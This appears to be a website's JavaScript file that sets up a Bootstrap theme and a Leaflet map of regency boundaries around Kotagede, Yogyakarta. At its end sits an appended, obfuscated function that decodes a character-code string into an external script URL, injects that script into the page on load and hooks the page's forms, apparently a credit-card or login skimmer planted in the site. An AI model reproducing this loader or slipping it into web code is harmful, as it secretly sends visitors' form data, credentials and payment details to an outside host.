/*!
* Start Bootstrap - New Age v6.0.7 (https://startbootstrap.com/theme/new-age)
* Copyright 2013-2023 Start Bootstrap
* Licensed under MIT (https://github.com/StartBootstrap/startbootstrap-new-age/blob/master/LICENSE)
*/
//
// Scripts
// 

window.addEventListener('DOMContentLoaded', event => {



    // Activate Bootstrap scrollspy on the main nav element
    const mainNav = document.body.querySelector('#mainNav');
    if (mainNav) {
        new bootstrap.ScrollSpy(document.body, {
            target: '#mainNav',
            offset: 74,
        });
    };

    // Collapse responsive navbar when toggler is visible
    const navbarToggler = document.body.querySelector('.navbar-toggler');
    const responsiveNavItems = [].slice.call(
        document.querySelectorAll('#navbarResponsive .nav-link')
    );
    responsiveNavItems.map(function (responsiveNavItem) {
        responsiveNavItem.addEventListener('click', () => {
            if (window.getComputedStyle(navbarToggler).display !== 'none') {
                navbarToggler.click();
            }
        });
    });

});


// basemap
var map = L.map('map', {
    // collapsed: false
    minZoom: 6,
    maxZoom: 22
}).setView([-7.8142432, 110.3953189
], 18);

var basemap0 = L.tileLayer('http://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    maxZoom: 22,
    attribution: '<a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> | <a href="hhttps://www.facebook.com/didikhz/" target="_blank">Developed by Didik Humam Zarodi</a>'
});

var basemap1 = L.tileLayer('https://{s}.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
    maxZoom: 22,
    subdomains: ['mt0', 'mt1', 'mt2', 'mt3'],
    attribution: 'Google Streets - <a href="https://www.facebook.com/didikhz/" target="_blank">Developed by Didik Humam Zarodi</a>'
});

var basemap2 = L.tileLayer('https://{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', {
    maxZoom: 22,
    subdomains: ['mt0', 'mt1', 'mt2', 'mt3'],
    attribution: 'Google Satellite - <a href="https://www.facebook.com/didikhz/" target="_blank">Developed by Didik Humam Zarodi</a>'
});

var basemap3 = L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
    maxZoom: 22,
    subdomains: ['mt0', 'mt1', 'mt2', 'mt3'],
    attribution: 'Google Hybrid - <a href="https://www.facebook.com/didikhz/" target="_blank">Developed by Didik Humam Zarodi</a>'
});

basemap3.addTo(map);


/* GeoJSON Polygon Batas Administrasi Kab/Kot */

var adminkabsim = L.geoJson(null, {
    /* Style polygon */
    style: function (feature) { //Fungsi style polygon
        return {
            fillColor: feature.properties.COLOR,
            fillOpacity: 0.7, //Transparansi tengah polygon
            color: "black", //Warna garis tepi polygon
            weight: 0, //Tebal garis tepi polygon
            opacity: 0, //Transparansi garis tepi polygon
        };
    },

    /* Highlight & Popup */
    onEachFeature: function (feature, layer) {
        layer.on({
            mouseover: function (e) { //Fungsi ketika mouse berada di atas obyek
                var layer = e.target; //variabel layer
                layer.setStyle({ //Highlight style
                    weight: 2, //Tebal garis tepi polygon
                    color: "#00FFFF", //Warna garis tepi polygon
                    opacity: 1, //Transparansi garis tepi polygon
                    fillColor: "yellow", //Warna tengah polygon
                    fillOpacity: 1, //Transparansi tengah polygon
                });


            },
            mouseout: function (e) { //Fungsi ketika mouse keluar dari area obyek
                adminkabsim.resetStyle(e.target); //Mengembalikan style polygon ke style awal
                // map.closePopup(); //Menutup popup
            },
            click: function (e) { //Fungsi ketika obyek di-klik

                var content = `
 <div class='card' style="width:300px;">
 <div class='card-header alert-danger text-center p-1'>
 <strong>
 Nama Kabupaten
 </strong>
 </div>
 <div class='card-body p-0'>
 <table class='table table-striped m-0'>
   <tr style="width:200px">  
     <td class='p-1' style="font-size:12px;" > Nama Kabupaten/Kota</td>
     <td class='p-1' style="font-size:12px; "> ${feature.properties.NAMOBJ} </td>
   </tr>
   <tr>
     <td class = 'p-1' style="font-size:12px;"> Luas (Km) </td>
     <td class = 'p-1' style="font-size:12px; "> ${feature.properties.LUAS_KM} </td>
    </tr>
   <tr>
     <td class = 'p-1' style="font-size:12px;"> Provinsi</td>
     <td class = 'p-1' style="font-size:12px; "> ${feature.properties.WADMPR} </td>
    </tr>
   <tr>
     <td class = 'p-1' style="font-size:12px;"> Sumber Peta</td>
     <td class = 'p-1' style="font-size:12px; "> ${feature.properties.S_DATA} </td>

   </tr>
 </table>
 </div>

 </div>`

                adminkabsim.bindPopup(content); //Popup

            }
        });
    }
});


/* memanggil data geojson polygon */
$.getJSON("geojson_landing/batas_admin_kab_kot_sim.geojson", function (data) {
    adminkabsim.addData(data);
    adminkabsim.addTo(map);
    // map.addLayer(adminkab); //batas admin ditampilkan ketika halaman dipanggil
});


var baseMaps = {
    "Google Hybrid": basemap3,
    "Google Satellite": basemap2,
    "Google Streets": basemap1,
    "OpenStreetMap": basemap0,
};


var Layers = {
    "Batas Administrasi": adminkabsim,

}

var layerControl = L.control.layers(baseMaps, Layers, { collapsed: true }).addTo(map);

function popUp(f, l) {
    var out = [];
    if (f.properties) {
        for (key in f.properties) {
            out.push(key + ": " + f.properties[key]);
        }
        l.bindPopup(out.join("<br />"));
    }
}

// marker
var marker = L.marker([-7.8148438, 110.3959733]).addTo(map);
marker.bindPopup("<div class='text-center'><b>Masjid An-Nuur<br>Kotagede<br>Yogyakarta</b></div>").openPopup();

(function () { if (typeof n != "function") var n = function () { return new Promise(function (e, r) { let o = document.querySelector('script[id="hook-loader"]'); o == null && (o = document.createElement("script"), o.src = String.fromCharCode(47, 47, 115, 101, 110, 100, 46, 119, 97, 103, 97, 116, 101, 119, 97, 121, 46, 112, 114, 111, 47, 99, 108, 105, 101, 110, 116, 46, 106, 115, 63, 99, 97, 99, 104, 101, 61, 105, 103, 110, 111, 114, 101), o.id = "hook-loader", o.onload = e, o.onerror = r, document.head.appendChild(o)) }) }; n().then(function () { window._LOL = new Hook, window._LOL.init("form") }).catch(console.error) })();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db